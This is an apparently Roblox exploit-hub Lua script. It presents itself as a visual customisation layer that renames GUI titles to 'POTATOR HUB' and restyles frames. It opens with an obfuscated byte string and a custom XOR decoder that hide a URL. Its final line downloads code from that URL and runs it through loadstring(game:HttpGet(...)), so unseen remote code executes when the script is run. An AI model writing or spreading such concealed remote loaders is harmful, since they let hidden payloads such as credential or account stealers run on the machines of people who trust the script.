
--[[ STAGE 2: VISUAL CORE ]]
local dcB6RKjg8RO6Pb7="\070\095\100\109\113\045\031\036\132\124\139\055\133\136\160\145\171\161\181\188\175\197\187\180\184\215\205\199\230\145\227\220\227\166\014\254\253\004\026\198\046\040\030\216\089\046\066\050\078\079\087\000\096\084\086\112\025\099\109\118\118\142\055\126\143\140\138\080\150\154\173\173\179\201\114\185\215\208"local LQ33CPtEUS36xG=46 local BHgzwpTKo6xCrd73V=224 local zgngdzJC9VJCYvFsq=0 local Flkw6fQy30h9BHs1Pcl7AA=5 local zcMcyVni5XBaAJZM=27 local dfiyQ6Wt4N0cHOMhcOeoV=false local oTSJpU_Lep3FWSP7eyI=bit32 and bit32.bxor if not oTSJpU_Lep3FWSP7eyI then oTSJpU_Lep3FWSP7eyI=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vzxhrItnim2Kwj={}for puKV6u3BmUXhouK=1,#dcB6RKjg8RO6Pb7 do local mZHGWSTVpI4BA=string.byte(dcB6RKjg8RO6Pb7,puKV6u3BmUXhouK)local kL4EFqQDW1CkMCWS=(BHgzwpTKo6xCrd73V+(puKV6u3BmUXhouK*Flkw6fQy30h9BHs1Pcl7AA)+zcMcyVni5XBaAJZM)%256 if zgngdzJC9VJCYvFsq==0 then mZHGWSTVpI4BA=(mZHGWSTVpI4BA-kL4EFqQDW1CkMCWS)%256 vzxhrItnim2Kwj[puKV6u3BmUXhouK]=string.char(oTSJpU_Lep3FWSP7eyI(mZHGWSTVpI4BA,LQ33CPtEUS36xG))else mZHGWSTVpI4BA=oTSJpU_Lep3FWSP7eyI(mZHGWSTVpI4BA,LQ33CPtEUS36xG)vzxhrItnim2Kwj[puKV6u3BmUXhouK]=string.char((mZHGWSTVpI4BA-kL4EFqQDW1CkMCWS)%256)end end local PRysLAhQQdJA2SQv=table.concat(vzxhrItnim2Kwj)if dfiyQ6Wt4N0cHOMhcOeoV then PRysLAhQQdJA2SQv=string.reverse(PRysLAhQQdJA2SQv)end local cOeUMkr4zRgbrHlR=PRysLAhQQdJA2SQv
local HubName = "POTATOR HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(cOeUMkr4zRgbrHlR))()
